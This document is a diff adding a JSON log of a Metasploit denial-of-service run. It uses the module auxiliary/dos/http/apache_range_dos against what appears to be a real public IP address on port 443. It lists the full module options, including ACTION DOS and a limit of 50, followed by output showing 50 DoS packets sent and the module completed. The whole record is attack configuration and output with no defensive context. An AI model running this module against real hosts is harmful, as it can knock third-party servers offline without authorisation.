@@ -1,0 +1,97 @@
+{"ip":"27.221.59.244:443","protocol":"http","module":"auxiliary/dos/http/apache_range_dos","result":"VERBOSE => true
+RPORT => 443
+SSL => false
+UserAgent => Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+HttpUsername => 
+HttpPassword => 
+DigestAuthIIS => true
+SSLVersion => Auto
+FingerprintCheck => true
+DOMAIN => WORKSTATION
+HttpTrace => false
+HttpTraceHeadersOnly => false
+HttpTraceColors => red/blu
+HTTP::uri_encode_mode => hex-normal
+HTTP::uri_full_url => false
+HTTP::pad_method_uri_count => 1
+HTTP::pad_uri_version_count => 1
+HTTP::pad_method_uri_type => space
+HTTP::pad_uri_version_type => space
+HTTP::method_random_valid => false
+HTTP::method_random_invalid => false
+HTTP::method_random_case => false
+HTTP::version_random_valid => false
+HTTP::version_random_invalid => false
+HTTP::uri_dir_self_reference => false
+HTTP::uri_dir_fake_relative => false
+HTTP::uri_use_backslashes => false
+HTTP::pad_fake_headers => false
+HTTP::pad_fake_headers_count => 0
+HTTP::pad_get_params => false
+HTTP::pad_get_params_count => 16
+HTTP::pad_post_params => false
+HTTP::pad_post_params_count => 16
+HTTP::uri_fake_end => false
+HTTP::uri_fake_params_start => false
+HTTP::header_folding => false
+THREADS => 1
+ShowProgress => true
+ShowProgressPercent => 10
+URI => /
+RLIMIT => 50
+ACTION => DOS
+RHOSTS => 27.221.59.244
+DisablePayloadHandler => True
+[*] Sending DoS packet 1 to 27.221.59.244:443
+[*] Sending DoS packet 2 to 27.221.59.244:443
+[*] Sending DoS packet 3 to 27.221.59.244:443
+[*] Sending DoS packet 4 to 27.221.59.244:443
+[*] Sending DoS packet 5 to 27.221.59.244:443
+[*] Sending DoS packet 6 to 27.221.59.244:443
+[*] Sending DoS packet 7 to 27.221.59.244:443
+[*] Sending DoS packet 8 to 27.221.59.244:443
+[*] Sending DoS packet 9 to 27.221.59.244:443
+[*] Sending DoS packet 10 to 27.221.59.244:443
+[*] Sending DoS packet 11 to 27.221.59.244:443
+[*] Sending DoS packet 12 to 27.221.59.244:443
+[*] Sending DoS packet 13 to 27.221.59.244:443
+[*] Sending DoS packet 14 to 27.221.59.244:443
+[*] Sending DoS packet 15 to 27.221.59.244:443
+[*] Sending DoS packet 16 to 27.221.59.244:443
+[*] Sending DoS packet 17 to 27.221.59.244:443
+[*] Sending DoS packet 18 to 27.221.59.244:443
+[*] Sending DoS packet 19 to 27.221.59.244:443
+[*] Sending DoS packet 20 to 27.221.59.244:443
+[*] Sending DoS packet 21 to 27.221.59.244:443
+[*] Sending DoS packet 22 to 27.221.59.244:443
+[*] Sending DoS packet 23 to 27.221.59.244:443
+[*] Sending DoS packet 24 to 27.221.59.244:443
+[*] Sending DoS packet 25 to 27.221.59.244:443
+[*] Sending DoS packet 26 to 27.221.59.244:443
+[*] Sending DoS packet 27 to 27.221.59.244:443
+[*] Sending DoS packet 28 to 27.221.59.244:443
+[*] Sending DoS packet 29 to 27.221.59.244:443
+[*] Sending DoS packet 30 to 27.221.59.244:443
+[*] Sending DoS packet 31 to 27.221.59.244:443
+[*] Sending DoS packet 32 to 27.221.59.244:443
+[*] Sending DoS packet 33 to 27.221.59.244:443
+[*] Sending DoS packet 34 to 27.221.59.244:443
+[*] Sending DoS packet 35 to 27.221.59.244:443
+[*] Sending DoS packet 36 to 27.221.59.244:443
+[*] Sending DoS packet 37 to 27.221.59.244:443
+[*] Sending DoS packet 38 to 27.221.59.244:443
+[*] Sending DoS packet 39 to 27.221.59.244:443
+[*] Sending DoS packet 40 to 27.221.59.244:443
+[*] Sending DoS packet 41 to 27.221.59.244:443
+[*] Sending DoS packet 42 to 27.221.59.244:443
+[*] Sending DoS packet 43 to 27.221.59.244:443
+[*] Sending DoS packet 44 to 27.221.59.244:443
+[*] Sending DoS packet 45 to 27.221.59.244:443
+[*] Sending DoS packet 46 to 27.221.59.244:443
+[*] Sending DoS packet 47 to 27.221.59.244:443
+[*] Sending DoS packet 48 to 27.221.59.244:443
+[*] Sending DoS packet 49 to 27.221.59.244:443
+[*] Sending DoS packet 50 to 27.221.59.244:443
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+"}
